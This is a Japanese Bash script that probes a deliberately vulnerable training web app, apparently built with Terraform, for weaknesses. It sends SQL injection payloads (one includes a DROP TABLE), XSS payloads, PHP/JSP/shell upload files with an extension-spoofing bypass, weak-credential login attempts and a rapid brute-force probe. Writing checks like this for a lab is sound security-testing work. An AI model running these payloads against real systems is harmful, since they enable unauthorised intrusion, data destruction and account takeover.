#!/bin/bash

# アプリケーション脆弱性検証テストスクリプト
# SQLインジェクション、XSS、ファイルアップロード、認証弱点の脆弱性をテスト

set -e

# 設定
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_FILE="${SCRIPT_DIR}/vulnerability_test.log"
TERRAFORM_DIR="${SCRIPT_DIR}/../terraform"
TEMP_DIR="/tmp/gameday_vuln_test"

# カラー出力
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# ログ関数
log() {
    echo -e "${BLUE}[$(date '+%Y-%m-%d %H:%M:%S')]${NC} $1" | tee -a "$LOG_FILE"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1" | tee -a "$LOG_FILE"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1" | tee -a "$LOG_FILE"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1" | tee -a "$LOG_FILE"
}

log_vuln() {
    echo -e "${RED}[VULNERABILITY]${NC} $1" | tee -a "$LOG_FILE"
}

# 使用方法
usage() {
    echo "使用方法: $0 [オプション]"
    echo "オプション:"
    echo "  -u, --url URL        テスト対象のURL (デフォルト: Terraformから自動取得)"
    echo "  -t, --test TYPE      実行するテストタイプ (sqli|xss|upload|auth|all, デフォルト: all)"
    echo "  -v, --verbose        詳細出力を有効にする"
    echo "  -h, --help          このヘルプメッセージを表示"
    echo ""
    echo "例:"
    echo "  $0 --url http://example.com --test sqli"
    echo "  $0 --test all --verbose"
}

# デフォルト値
TARGET_URL=""
TEST_TYPE="all"
VERBOSE=false

# コマンドライン引数の解析
while [[ $# -gt 0 ]]; do
    case $1 in
        -u|--url)
            TARGET_URL="$2"
            shift 2
            ;;
        -t|--test)
            TEST_TYPE="$2"
            shift 2
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        -h|--help)
            usage
            exit 0
            ;;
        *)
            log_error "不明なオプション: $1"
            usage
            exit 1
            ;;
    esac
done

# 必要なツールの確認
check_dependencies() {
    log "依存関係を確認中..."
    
    local deps=("curl" "jq")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            log_error "$dep が見つかりません。インストールしてください。"
            exit 1
        fi
    done
    
    # 一時ディレクトリの作成
    mkdir -p "$TEMP_DIR"
    
    log_success "すべての依存関係が確認されました"
}

# ターゲットURLの取得
get_target_url() {
    if [[ -n "$TARGET_URL" ]]; then
        log "指定されたURL: $TARGET_URL"
        return 0
    fi
    
    log "TerraformからターゲットURLを取得中..."
    
    if [[ ! -d "$TERRAFORM_DIR" ]]; then
        log_error "Terraformディレクトリが見つかりません: $TERRAFORM_DIR"
        exit 1
    fi
    
    cd "$TERRAFORM_DIR"
    
    # Terraform出力の取得
    if ! terraform output -json > /tmp/terraform_outputs.json 2>/dev/null; then
        log_error "Terraform出力の取得に失敗しました。terraform applyが実行されているか確認してください。"
        exit 1
    fi
    
    # ALB DNS名の取得
    local alb_dns=$(jq -r '.alb_dns_name.value // empty' /tmp/terraform_outputs.json)
    local cloudfront_domain=$(jq -r '.cloudfront_domain_name.value // empty' /tmp/terraform_outputs.json)
    
    # CloudFrontが有効な場合はそちらを優先
    if [[ -n "$cloudfront_domain" ]]; then
        TARGET_URL="https://$cloudfront_domain"
        log "CloudFrontドメインを使用: $TARGET_URL"
    elif [[ -n "$alb_dns" ]]; then
        TARGET_URL="http://$alb_dns"
        log "ALB DNSを使用: $TARGET_URL"
    else
        log_error "ターゲットURLが取得できませんでした"
        exit 1
    fi
}

# アプリケーションの可用性確認
check_application_availability() {
    log "アプリケーションの可用性を確認中..."
    
    local response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL" || echo "000")
    
    if [[ "$response" == "200" ]]; then
        log_success "アプリケーションが利用可能です (HTTP $response)"
        return 0
    else
        log_error "アプリケーションが利用できません (HTTP $response)"
        return 1
    fi
}# SQL
インジェクション脆弱性テスト
test_sql_injection() {
    log "SQLインジェクション脆弱性をテスト中..."
    
    local test_passed=false
    local payloads=(
        "' OR '1'='1"
        "' OR 1=1--"
        "admin'--"
        "' UNION SELECT 1,2,3--"
        "'; DROP TABLE users;--"
        "' OR 'a'='a"
        "1' OR '1'='1' /*"
    )
    
    # ログインエンドポイントのテスト
    log "ログインフォームでのSQLインジェクションをテスト中..."
    for payload in "${payloads[@]}"; do
        if $VERBOSE; then
            log "ペイロードをテスト中: $payload"
        fi
        
        local response=$(curl -s -X POST "$TARGET_URL/login" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "username=${payload}&password=anything" \
            -w "%{http_code}" -o "$TEMP_DIR/sqli_login_response.html")
        
        # レスポンスの内容を確認
        local content=$(cat "$TEMP_DIR/sqli_login_response.html" 2>/dev/null || echo "")
        
        # 成功の兆候を確認
        if [[ "$content" == *"welcome"* ]] || [[ "$content" == *"dashboard"* ]] || [[ "$content" == *"admin"* ]] || [[ "$response" == "302" ]]; then
            log_vuln "SQLインジェクション成功: ペイロード '$payload' でログインバイパスが可能"
            test_passed=true
            break
        fi
        
        # エラーメッセージの確認（情報漏洩）
        if [[ "$content" == *"SQL"* ]] || [[ "$content" == *"syntax error"* ]] || [[ "$content" == *"database"* ]]; then
            log_vuln "SQLエラーメッセージが露出: ペイロード '$payload'"
            test_passed=true
        fi
    done
    
    # 検索エンドポイントのテスト
    log "検索機能でのSQLインジェクションをテスト中..."
    for payload in "${payloads[@]}"; do
        if $VERBOSE; then
            log "検索ペイロードをテスト中: $payload"
        fi
        
        local encoded_payload=$(printf '%s' "$payload" | jq -sRr @uri)
        local response=$(curl -s "$TARGET_URL/search?q=${encoded_payload}" \
            -w "%{http_code}" -o "$TEMP_DIR/sqli_search_response.html")
        
        local content=$(cat "$TEMP_DIR/sqli_search_response.html" 2>/dev/null || echo "")
        
        # データベースエラーや異常な結果の確認
        if [[ "$content" == *"SQL"* ]] || [[ "$content" == *"error"* ]] || [[ "$content" == *"database"* ]]; then
            log_vuln "検索でのSQLインジェクション脆弱性: ペイロード '$payload'"
            test_passed=true
        fi
        
        # 異常に多くの結果が返される場合
        local result_count=$(echo "$content" | grep -o "result" | wc -l || echo "0")
        if [[ "$result_count" -gt 10 ]]; then
            log_vuln "検索でのSQLインジェクション可能性: 異常に多くの結果 ($result_count)"
            test_passed=true
        fi
    done
    
    if $test_passed; then
        log_error "SQLインジェクション脆弱性が確認されました"
        return 1
    else
        log_warning "SQLインジェクション脆弱性が検出されませんでした（設定を確認してください）"
        return 0
    fi
}

# XSS脆弱性テスト
test_xss_vulnerability() {
    log "XSS脆弱性をテスト中..."
    
    local test_passed=false
    local payloads=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "<svg onload=alert('XSS')>"
        "javascript:alert('XSS')"
        "<iframe src=javascript:alert('XSS')></iframe>"
        "<body onload=alert('XSS')>"
        "'\"><script>alert('XSS')</script>"
        "<script>document.write('XSS')</script>"
    )
    
    # 検索機能でのXSSテスト
    log "検索機能でのXSSをテスト中..."
    for payload in "${payloads[@]}"; do
        if $VERBOSE; then
            log "XSSペイロードをテスト中: $payload"
        fi
        
        local encoded_payload=$(printf '%s' "$payload" | jq -sRr @uri)
        local response=$(curl -s "$TARGET_URL/search?q=${encoded_payload}" \
            -w "%{http_code}" -o "$TEMP_DIR/xss_response.html")
        
        local content=$(cat "$TEMP_DIR/xss_response.html" 2>/dev/null || echo "")
        
        # ペイロードがそのまま反映されているかチェック
        if [[ "$content" == *"$payload"* ]] || [[ "$content" == *"<script>"* ]] || [[ "$content" == *"alert"* ]]; then
            log_vuln "XSS脆弱性確認: ペイロード '$payload' が反映されています"
            test_passed=true
        fi
        
        # HTMLエンコードされていない場合
        if [[ "$content" == *"<"* ]] && [[ "$content" == *">"* ]] && [[ "$content" != *"&lt;"* ]]; then
            log_vuln "HTMLエンコード不備: XSS攻撃が可能"
            test_passed=true
        fi
    done
    
    # コメント機能でのXSSテスト（存在する場合）
    log "コメント機能でのXSSをテスト中..."
    for payload in "${payloads[@]}"; do
        local response=$(curl -s -X POST "$TARGET_URL/comment" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "comment=${payload}" \
            -w "%{http_code}" -o "$TEMP_DIR/xss_comment_response.html" 2>/dev/null || echo "404")
        
        if [[ "$response" != "404" ]]; then
            local content=$(cat "$TEMP_DIR/xss_comment_response.html" 2>/dev/null || echo "")
            if [[ "$content" == *"$payload"* ]]; then
                log_vuln "コメント機能でのXSS脆弱性: ペイロード '$payload'"
                test_passed=true
            fi
        fi
    done
    
    if $test_passed; then
        log_error "XSS脆弱性が確認されました"
        return 1
    else
        log_warning "XSS脆弱性が検出されませんでした（設定を確認してください）"
        return 0
    fi
}

# ファイルアップロード脆弱性テスト
test_file_upload_vulnerability() {
    log "ファイルアップロード脆弱性をテスト中..."
    
    local test_passed=false
    
    # 悪意のあるファイルの作成
    cat > "$TEMP_DIR/malicious.php" << 'EOF'
<?php
echo "PHP Code Execution Test";
phpinfo();
?>
EOF
    
    cat > "$TEMP_DIR/malicious.jsp" << 'EOF'
<%
out.println("JSP Code Execution Test");
%>
EOF
    
    cat > "$TEMP_DIR/malicious.html" << 'EOF'
<html>
<body>
<script>alert('File Upload XSS')</script>
<h1>Malicious HTML File</h1>
</body>
</html>
EOF
    
    # 実行可能ファイルの作成
    echo '#!/bin/bash\necho "Shell script execution"' > "$TEMP_DIR/malicious.sh"
    chmod +x "$TEMP_DIR/malicious.sh"
    
    local files=(
        "$TEMP_DIR/malicious.php"
        "$TEMP_DIR/malicious.jsp"
        "$TEMP_DIR/malicious.html"
        "$TEMP_DIR/malicious.sh"
    )
    
    # ファイルアップロードエンドポイントの確認
    log "ファイルアップロード機能を確認中..."
    
    for file in "${files[@]}"; do
        local filename=$(basename "$file")
        if $VERBOSE; then
            log "ファイルをアップロード中: $filename"
        fi
        
        local response=$(curl -s -X POST "$TARGET_URL/upload" \
            -F "file=@${file}" \
            -w "%{http_code}" -o "$TEMP_DIR/upload_response.html" 2>/dev/null || echo "404")
        
        if [[ "$response" == "404" ]]; then
            # 別のエンドポイントを試す
            response=$(curl -s -X POST "$TARGET_URL/file-upload" \
                -F "file=@${file}" \
                -w "%{http_code}" -o "$TEMP_DIR/upload_response.html" 2>/dev/null || echo "404")
        fi
        
        if [[ "$response" != "404" ]]; then
            local content=$(cat "$TEMP_DIR/upload_response.html" 2>/dev/null || echo "")
            
            # アップロード成功の確認
            if [[ "$content" == *"success"* ]] || [[ "$content" == *"uploaded"* ]] || [[ "$response" == "200" ]]; then
                log_vuln "危険なファイルのアップロードが成功: $filename (HTTP $response)"
                test_passed=true
                
                # アップロードされたファイルへのアクセステスト
                local upload_url="${TARGET_URL}/uploads/${filename}"
                local access_response=$(curl -s -o /dev/null -w "%{http_code}" "$upload_url" 2>/dev/null || echo "404")
                
                if [[ "$access_response" == "200" ]]; then
                    log_vuln "アップロードされたファイルに直接アクセス可能: $upload_url"
                fi
            fi
            
            # エラーメッセージの確認
            if [[ "$content" == *"error"* ]] && [[ "$content" != *"file type"* ]] && [[ "$content" != *"extension"* ]]; then
                log_warning "ファイルアップロードでエラーが発生しましたが、適切な検証が行われている可能性があります"
            fi
        fi
    done
    
    # ファイル拡張子偽装テスト
    log "ファイル拡張子偽装をテスト中..."
    cp "$TEMP_DIR/malicious.php" "$TEMP_DIR/image.jpg.php"
    
    local response=$(curl -s -X POST "$TARGET_URL/upload" \
        -F "file=@${TEMP_DIR}/image.jpg.php" \
        -w "%{http_code}" -o "$TEMP_DIR/bypass_response.html" 2>/dev/null || echo "404")
    
    if [[ "$response" != "404" ]]; then
        local content=$(cat "$TEMP_DIR/bypass_response.html" 2>/dev/null || echo "")
        if [[ "$content" == *"success"* ]] || [[ "$response" == "200" ]]; then
            log_vuln "ファイル拡張子偽装によるアップロードが成功"
            test_passed=true
        fi
    fi
    
    if $test_passed; then
        log_error "ファイルアップロード脆弱性が確認されました"
        return 1
    else
        log_warning "ファイルアップロード脆弱性が検出されませんでした（機能が存在しないか、適切に保護されています）"
        return 0
    fi
}# 認証弱点テス
ト
test_authentication_weakness() {
    log "認証弱点をテスト中..."
    
    local test_passed=false
    
    # 弱いパスワードでのログインテスト
    log "弱いパスワードでのログインをテスト中..."
    local weak_passwords=(
        "password"
        "123456"
        "admin"
        "test"
        "guest"
        "root"
        "user"
        ""
    )
    
    local common_usernames=(
        "admin"
        "administrator"
        "root"
        "user"
        "test"
        "guest"
    )
    
    for username in "${common_usernames[@]}"; do
        for password in "${weak_passwords[@]}"; do
            if $VERBOSE; then
                log "ログインテスト: $username / $password"
            fi
            
            local response=$(curl -s -X POST "$TARGET_URL/login" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -d "username=${username}&password=${password}" \
                -w "%{http_code}" -o "$TEMP_DIR/auth_response.html" \
                -c "$TEMP_DIR/cookies.txt")
            
            local content=$(cat "$TEMP_DIR/auth_response.html" 2>/dev/null || echo "")
            
            # ログイン成功の確認
            if [[ "$content" == *"welcome"* ]] || [[ "$content" == *"dashboard"* ]] || [[ "$response" == "302" ]]; then
                log_vuln "弱いパスワードでのログイン成功: $username / $password"
                test_passed=true
            fi
            
            # セッション管理の確認
            if [[ -f "$TEMP_DIR/cookies.txt" ]]; then
                local session_cookie=$(grep -i "session" "$TEMP_DIR/cookies.txt" 2>/dev/null || echo "")
                if [[ -n "$session_cookie" ]]; then
                    # セッションIDの強度確認
                    local session_id=$(echo "$session_cookie" | awk '{print $7}')
                    if [[ ${#session_id} -lt 16 ]]; then
                        log_vuln "弱いセッションID: $session_id (長さ: ${#session_id})"
                        test_passed=true
                    fi
                    
                    # セッションの予測可能性テスト
                    if [[ "$session_id" =~ ^[0-9]+$ ]]; then
                        log_vuln "予測可能なセッションID: $session_id (数字のみ)"
                        test_passed=true
                    fi
                fi
            fi
        done
    done
    
    # パスワードリセット機能のテスト
    log "パスワードリセット機能をテスト中..."
    local reset_response=$(curl -s -X POST "$TARGET_URL/reset-password" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "email=admin@example.com" \
        -w "%{http_code}" -o "$TEMP_DIR/reset_response.html" 2>/dev/null || echo "404")
    
    if [[ "$reset_response" != "404" ]]; then
        local reset_content=$(cat "$TEMP_DIR/reset_response.html" 2>/dev/null || echo "")
        
        # 情報漏洩の確認
        if [[ "$reset_content" == *"user not found"* ]] || [[ "$reset_content" == *"invalid email"* ]]; then
            log_vuln "パスワードリセット機能でユーザー存在情報が漏洩"
            test_passed=true
        fi
        
        # リセットトークンの確認
        if [[ "$reset_content" == *"token"* ]] || [[ "$reset_content" == *"reset"* ]]; then
            log_warning "パスワードリセット機能が存在します（トークンの強度を確認してください）"
        fi
    fi
    
    # セッション固定攻撃のテスト
    log "セッション固定攻撃をテスト中..."
    
    # ログイン前のセッションID取得
    curl -s "$TARGET_URL" -c "$TEMP_DIR/before_login.txt" > /dev/null
    local session_before=$(grep -i "session" "$TEMP_DIR/before_login.txt" 2>/dev/null | awk '{print $7}' || echo "")
    
    # ログイン実行
    curl -s -X POST "$TARGET_URL/login" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=admin&password=admin" \
        -b "$TEMP_DIR/before_login.txt" \
        -c "$TEMP_DIR/after_login.txt" > /dev/null
    
    local session_after=$(grep -i "session" "$TEMP_DIR/after_login.txt" 2>/dev/null | awk '{print $7}' || echo "")
    
    if [[ -n "$session_before" ]] && [[ -n "$session_after" ]] && [[ "$session_before" == "$session_after" ]]; then
        log_vuln "セッション固定脆弱性: ログイン前後でセッションIDが変更されていません"
        test_passed=true
    fi
    
    # ブルートフォース攻撃保護のテスト
    log "ブルートフォース攻撃保護をテスト中..."
    local failed_attempts=0
    
    for i in {1..10}; do
        local bf_response=$(curl -s -X POST "$TARGET_URL/login" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "username=admin&password=wrong${i}" \
            -w "%{http_code}" -o /dev/null)
        
        if [[ "$bf_response" == "429" ]] || [[ "$bf_response" == "423" ]]; then
            log_success "ブルートフォース攻撃保護が動作しています (HTTP $bf_response)"
            break
        else
            ((failed_attempts++))
        fi
        
        sleep 0.5
    done
    
    if [[ $failed_attempts -eq 10 ]]; then
        log_vuln "ブルートフォース攻撃保護が設定されていません"
        test_passed=true
    fi
    
    if $test_passed; then
        log_error "認証弱点が確認されました"
        return 1
    else
        log_warning "認証弱点が検出されませんでした（設定を確認してください）"
        return 0
    fi
}

# 全脆弱性テストの実行
run_vulnerability_tests() {
    log "脆弱性テストを開始します"
    
    local test_results=()
    local overall_vulnerable=false
    
    case $TEST_TYPE in
        "sqli"|"all")
            if test_sql_injection; then
                test_results+=("SQLインジェクション: 保護されています")
            else
                test_results+=("SQLインジェクション: 脆弱性あり")
                overall_vulnerable=true
            fi
            ;;
    esac
    
    case $TEST_TYPE in
        "xss"|"all")
            if test_xss_vulnerability; then
                test_results+=("XSS: 保護されています")
            else
                test_results+=("XSS: 脆弱性あり")
                overall_vulnerable=true
            fi
            ;;
    esac
    
    case $TEST_TYPE in
        "upload"|"all")
            if test_file_upload_vulnerability; then
                test_results+=("ファイルアップロード: 保護されています")
            else
                test_results+=("ファイルアップロード: 脆弱性あり")
                overall_vulnerable=true
            fi
            ;;
    esac
    
    case $TEST_TYPE in
        "auth"|"all")
            if test_authentication_weakness; then
                test_results+=("認証: 適切に設定されています")
            else
                test_results+=("認証: 弱点あり")
                overall_vulnerable=true
            fi
            ;;
    esac
    
    # 結果の表示
    log "脆弱性テスト結果:"
    for result in "${test_results[@]}"; do
        if [[ "$result" == *"脆弱性あり"* ]] || [[ "$result" == *"弱点あり"* ]]; then
            log_vuln "  $result"
        else
            log_success "  $result"
        fi
    done
    
    if $overall_vulnerable; then
        log_error "アプリケーションに脆弱性が確認されました（学習環境として正常）"
        return 1
    else
        log_warning "脆弱性が検出されませんでした（設定を確認してください）"
        return 0
    fi
}

# クリーンアップ
cleanup() {
    log "一時ファイルをクリーンアップ中..."
    rm -rf "$TEMP_DIR"
    log_success "クリーンアップが完了しました"
}

# メイン実行関数
main() {
    log "アプリケーション脆弱性テストを開始します"
    log "テストタイプ: $TEST_TYPE"
    
    # 初期化
    > "$LOG_FILE"
    
    # 依存関係の確認
    check_dependencies
    
    # ターゲットURLの取得
    get_target_url
    
    # アプリケーションの可用性確認
    if ! check_application_availability; then
        log_error "アプリケーションが利用できないため、テストを中止します"
        exit 1
    fi
    
    # 脆弱性テストの実行
    run_vulnerability_tests
    local test_result=$?
    
    # クリーンアップ
    cleanup
    
    log_success "脆弱性テストが完了しました"
    log "詳細なログは $LOG_FILE を確認してください"
    
    return $test_result
}

# トラップでクリーンアップを確実に実行
trap cleanup EXIT

# スクリプトの実行
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi